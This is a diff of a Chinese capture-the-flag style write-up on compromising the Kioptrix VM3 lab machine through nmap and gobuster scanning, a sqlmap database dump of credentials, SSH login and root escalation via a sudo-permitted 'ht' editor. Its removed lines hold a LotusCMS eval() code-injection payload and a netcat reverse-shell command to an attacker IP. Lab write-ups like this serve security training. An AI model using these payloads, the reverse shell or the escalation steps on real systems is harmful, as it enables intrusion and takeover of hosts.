@@ -1,13 +1,60 @@
 # 靶机信息
-KioptrixVM3是vulnhub中的一台简单难度的渗透测试靶机
+KioptrixVM3也是一个vulnhub中的简单类型的渗透测试靶机。
 
-# 靶机初始枚举
+# 信息收集
+## NMAP扫描
 
-只开放了两个端口，攻击面很小，对信息收集的要求没那么高。
-
-扫一下目录
 ```
-└─$ cat webscan     
+└─$ nmap -sCV -p22,80 -O --min-rate 10000 192.168.218.199 -oA nmapScan/details 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 19:44 EST
+Nmap scan report for 192.168.218.199 (192.168.218.199)
+Host is up (0.00053s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-title: Ligoat Security - Got Goat? Security ...
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+MAC Address: 00:0C:29:DD:CD:12 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
+```
+只扫描出两个开放端口，没什么干扰，直接开始枚举信息。
+
+## 初始信息枚举
+先挂着扫一下目录
+```
+└─$ gobuster dir -u http://192.168.218.199/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.218.199/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
 /modules              (Status: 301) [Size: 359] [--> http://192.168.218.199/modules/]
 /cache                (Status: 301) [Size: 357] [--> http://192.168.218.199/cache/]
 /data                 (Status: 403) [Size: 326]
@@ -19,106 +66,84 @@ KioptrixVM3是vulnhub中的一台简单难度的渗透测试靶机
 /update.php           (Status: 200) [Size: 18]
 /server-status        (Status: 403) [Size: 335]
 /index.php            (Status: 200) [Size: 1819]
+Progress: 224656 / 224660 (100.00%)
+===============================================================
+Finished
+===============================================================
 ```
+看一下主页，扒拉一下。
 
-搜索一下lotusCMS的漏洞，有一个RCE漏洞
- Router() 函数中将 page= 参数传入 eval()，导致可以构造恶意输入
-`?page=');system("id");//  ← 变成 eval("');system('id');//");`
-扒到源码
+<img width="1919" height="972" alt="Image" src="https://github.com/user-attachments/assets/410dbd1d-b40c-4989-93bb-2063621bcf7c" />
+
+登录页面是一个CMS，搜一下已知漏洞。搜到一推，包括文件包含，sql注入，代码执行都可以利用。
+
+# 获取初始权限
+直接 Sqlmap 梭哈
+
 ```
-getInputString("page", "index");
-		
-		//Get plugin request (if any)
-		$plugin = $this->getInputString("system", "Page");
-		
-		//If there is a request for a plugin
-		if(file_exists("core/plugs/".$plugin."Starter.php")){
-			//Include Page fetcher
-			include("core/plugs/".$plugin."Starter.php");
-
-			//Fetch the page and get over loading cache etc...
-			eval("new ".$plugin."Starter('".$page."');");
-			
-		}else if(file_exists("data/modules/".$plugin."/starter.dat")){
-			//Include Module Fetching System
-			include("core/lib/ModuleLoader.php");
-			
-			//Load Module
-			new ModuleLoader($plugin, $this->getInputString("page", null));
-		}else{ //Otherwise load a page from the standard system.
-			//Include Page fetcher
-			include("core/plugs/PageStarter.php");
-			
-			//Fetch the page and get over loading cache etc...
-			new PageStarter($page);
-		}
-	}
-	
-	/**
-	 * Returns a global variable
-	 */
-	protected function getInputString($name, $default_value = "", $format = "GPCS")
-	{
-		//order of retrieve default GPCS (get, post, cookie, session);
-		$format_defines = array (
-		'G'=>'_GET',
-		'P'=>'_POST',
-		'C'=>'_COOKIE',
-		'S'=>'_SESSION',
-		'R'=>'_REQUEST',
-		'F'=>'_FILES',
-		);
-		preg_match_all("/[G|P|C|S|R|F]/", $format, $matches); //splitting to globals order
-		foreach ($matches[0] as $k=>$glb)
-		{
-		    if ( isset ($GLOBALS[$format_defines[$glb]][$name]))
-		    {   
-			return htmlentities ( trim ( $GLOBALS[$format_defines[$glb]][$name] ) , ENT_NOQUOTES ) ;
-		    }
-		}
-		return $default_value;
-	} 
-
-}
-
-?>
+Database: gallery                                                                                                                                                                          
+[7 tables]
++----------------------+
+| dev_accounts         |
+| gallarific_comments  |
+| gallarific_galleries |
+| gallarific_photos    |
+| gallarific_settings  |
+| gallarific_stats     |
+| gallarific_users     |
++----------------------+
 ```
+一共七个表，先看看users表
 
-<img width="1919" height="1039" alt="Image" src="https://github.com/user-attachments/assets/e0d23c11-d62a-4698-aa5b-fb5b63f51963" />
+```
+Database: gallery
+Table: gallarific_users
+[1 entry]
++--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
+| userid | email   | photo   | website | joincode | lastname | password | username | usertype  | firstname | datejoined | issuperuser |
++--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
+| 1      | <blank> | <blank> | <blank> | <blank>  | User     | n0t7t1k4 | admin    | superuser | Super     | 1302628616 | 1           |
++--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
 
-这里回弹shell需要使用 `nc 10.10.14.8 4444 -e /bin/bash` 
 ```
-┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/KioptrixVM3]
-└─$ sudo nc -lvnp 4444
-listening on [any] 4444 ...
-        connect to [192.168.218.148] from (UNKNOWN) [192.168.218.199] 57568
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-bash
+登录试试，登不进去，再看看accounts表
+
+```Database: gallery
+Table: dev_accounts
+[2 entries]
++----+---------------------------------------------+------------+
+| id | password                                    | username   |
++----+---------------------------------------------+------------+
+| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
+| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
++----+---------------------------------------------+------------+
 ```
+奇了个怪也登不上去
+
+<img width="1914" height="961" alt="Image" src="https://github.com/user-attachments/assets/b98ea329-a6de-4279-9534-d66ae3123331" />
+
+是ssh的用户，登录一下，两个用户都可以登录。
+
 # 提权
-在检索suid程序的时候检索到一个非默认程序/usr/local/bin/ht
-前提是使用python把交互环境配置好
-这是一个编辑程序可以直接使用它修改一下root的文件，可以在网上搜一下怎么使用的，打开之后按F3，输入/etc/sudoers，再编辑，再按F2保存，再按F10退出
-<img width="1605" height="678" alt="Image" src="https://github.com/user-attachments/assets/54dcc205-0b2a-45d7-bb14-fc87b8fd447e" />
+试试两个用户的权限
 ```
-www-data@Kioptrix3:/home/www/kioptrix3.com$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data@Kioptrix3:/home/www/kioptrix3.com$ ls
-cache  data         gallery       index.php  style
-core   favicon.ico  gnu-lgpl.txt  modules    update.php
-www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo -l
-User www-data may run the following commands on this host:
-    (ALL) NOPASSWD: ALL
-www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo su
-root@Kioptrix3:/home/www/kioptrix3.com# ls
-cache  data         gallery       index.php  style
-core   favicon.ico  gnu-lgpl.txt  modules    update.php
-root@Kioptrix3:/home/www/kioptrix3.com# cd
-root@Kioptrix3:~# ls
-Congrats.txt  ht-2.0.18
-root@Kioptrix3:~# 
+dreg@Kioptrix3:~$ sudo -l
+[sudo] password for dreg: 
+Sorry, user dreg may not run sudo on Kioptrix3.
+dreg@Kioptrix3:~$ su starwars
+Unknown id: starwars
+dreg@Kioptrix3:~$ su loneferret 
+Password: 
+loneferret@Kioptrix3:/home/dreg$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+loneferret@Kioptrix3:/home/dreg$ 
 ```
+是一个ht程序，直接搜索这个编辑器的用法，按F2打开文件/etc/passwd，修改uid，加用户等等很多提权方法，我因为不小心将uid改正1了，导致sudo用不了了，只能重装靶机了，算了已经是最后一步了，不重来了
 
-# 反思
-最后的提权不难，主要考的信息收集的能力，以及检索搜索漏洞的能力，这个靶机有很多漏洞，还有sql注入漏洞，去注入数据库那ssh的登录。
+<img width="1919" height="822" alt="Image" src="https://github.com/user-attachments/assets/5d6751b7-ea15-45bd-8b6e-2e58db578d4a" />
+
+到这里就提权结束了。
+
+其实一开始我是直接命令执行打进来的，但是不知道怎么提权才想着sql注入看看有什么别的路子，看来sql注入才是靶机想让你走的那条路。
